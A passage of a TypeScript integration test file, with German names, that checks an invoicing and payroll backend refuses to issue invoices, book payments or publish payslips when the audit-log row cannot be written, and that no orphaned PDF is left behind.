    await db.$executeRawUnsafe(`CREATE TRIGGER ${SPERRE} BEFORE INSERT ON audit_logs FOR EACH ROW EXECUTE FUNCTION ${SPERRE}()`);
    mitarbeiterId = data(await get<{ data: { id: string }[] }>('/api/employees', { jar: jars.admin }))[0]!.id;
    await lohnAufraeumen();
  });

  after(async () => {
    await lohnAufraeumen();
    const db = testDb();
    if (!db) return;
    await db.$executeRawUnsafe(`DROP TRIGGER IF EXISTS ${SPERRE} ON audit_logs`);
    await db.$executeRawUnsafe(`DROP FUNCTION IF EXISTS ${SPERRE}()`);
    await db.$executeRawUnsafe(`DROP TABLE IF EXISTS ${SPERRE}`);
  });

  it('Ausstellen ohne Protokollzeile gibt es nicht — die Rechnung bleibt Entwurf, und die Wiederholung stellt mit Zeile aus', async () => {
    const entwurf = await rechnung(false);
    const db = testDb()!;
    await sperren(entwurf.id);
    try {
      const gesperrt = await post(`/api/invoices/${entwurf.id}/issue`, undefined, { jar: jars.admin });
      assert.ok(gesperrt.status >= 400, `ausgestellt ohne Protokoll (kam ${gesperrt.status})`);
      const r = await db.invoice.findUniqueOrThrow({ where: { id: entwurf.id }, select: { status: true, number: true } });
      assert.equal(r.status, 'DRAFT', 'die Rechnung ist ohne Protokollzeile ausgestellt');
      assert.ok(r.number.startsWith('ENTWURF-'), `eine Nummer ist ohne Protokollzeile vergeben: ${r.number}`);
    } finally {
      await entsperren(entwurf.id);
    }

    assert.equal((await post(`/api/invoices/${entwurf.id}/issue`, undefined, { jar: jars.admin })).status, 200);
    const zeilen = await db.auditLog.findMany({ where: { entity: 'Invoice', entityId: entwurf.id, action: 'UPDATE' } });
    assert.ok(zeilen.some((z) => /ausgestellt/.test(z.summary ?? '')), 'die Ausstellung steht im Protokoll');
  });

  it('eine Büro-Zahlung ohne Protokollzeile wird nicht gebucht', async () => {
    const r = await rechnung(true);
    const db = testDb()!;
    await sperren(r.id);
    try {
      const gesperrt = await post(`/api/invoices/${r.id}/payments`, { amount: 20, method: 'BANK_TRANSFER', reference: MARKE }, { jar: jars.admin });
      assert.ok(gesperrt.status >= 400, `gebucht ohne Protokoll (kam ${gesperrt.status})`);
      assert.equal(await db.payment.count({ where: { invoiceId: r.id } }), 0, 'Zahlung ohne Protokollzeile gebucht');
      const stand = await db.invoice.findUniqueOrThrow({ where: { id: r.id }, select: { paidAmount: true } });
      assert.equal(Number(stand.paidAmount), 0);
    } finally {
      await entsperren(r.id);
    }

    const zahlung = await post(`/api/invoices/${r.id}/payments`, { amount: 20, method: 'BANK_TRANSFER', reference: MARKE }, { jar: jars.admin });
    assert.equal(zahlung.status, 201, zahlung.text);
    assert.equal(await db.auditLog.count({ where: { entity: 'Invoice', entityId: r.id, action: 'PAYMENT' } }), 1);
  });

  it('eine Lohnabrechnung wird nicht ohne ihre Protokollzeile veröffentlicht — und hinterlässt kein verwaistes PDF', async () => {
    const db = testDb()!;
    const abrechnung = await db.payslip.create({
      data: {
        employeeId: mitarbeiterId,
        year: LOHN_JAHR,
        month: LOHN_MONAT,
        hours: 10,
        grossPay: 300,
        netPay: 300,
        unverifiedRates: false,
        lines: { create: [{ position: 0, type: 'BASE', kind: 'EARNING', label: `${MARKE} Grundlohn`, quantity: 10, rate: 30, amount: 300 }] },
      },
      select: { id: true },
    });

    await sperren(abrechnung.id);
    try {
      const gesperrt = await post('/api/payroll/publish', { payslipIds: [abrechnung.id] }, { jar: jars.admin });
      assert.ok(gesperrt.status >= 400, `veröffentlicht ohne Protokoll (kam ${gesperrt.status}: ${gesperrt.text.slice(0, 200)})`);
      const stand = await db.payslip.findUniqueOrThrow({ where: { id: abrechnung.id }, select: { published: true, pdfFileId: true } });
      assert.equal(stand.published, false, 'die Abrechnung ist ohne Protokollzeile veröffentlicht');
      assert.equal(stand.pdfFileId, null);
      const waisen = await db.fileAsset.count({ where: { scope: 'PAYROLL', path: { contains: `/payroll/payslips/${abrechnung.id}` } } });
      assert.equal(waisen, 0, 'das PDF des gescheiterten Versuchs ist liegen geblieben');
    } finally {
      await entsperren(abrechnung.id);
    }

    const frei = await post<{ data: { veroeffentlicht: number } }>('/api/payroll/publish', { payslipIds: [abrechnung.id] }, { jar: jars.admin });
    assert.equal(frei.status, 200, frei.text);
    assert.equal(data(frei).veroeffentlicht, 1);
    const zeile = await db.auditLog.findFirst({ where: { entity: 'Payslip', entityId: abrechnung.id, action: 'UPDATE' } });
    assert.ok(zeile, 'die Veröffentlichung steht mit der Kennung der Abrechnung im Protokoll');
    assert.match(zeile.summary ?? '', /veröffentlicht/);
    assert.ok(!/300/.test(zeile.summary ?? ''), 'Beträge gehören nicht in die Protokollzeile');
  });
});
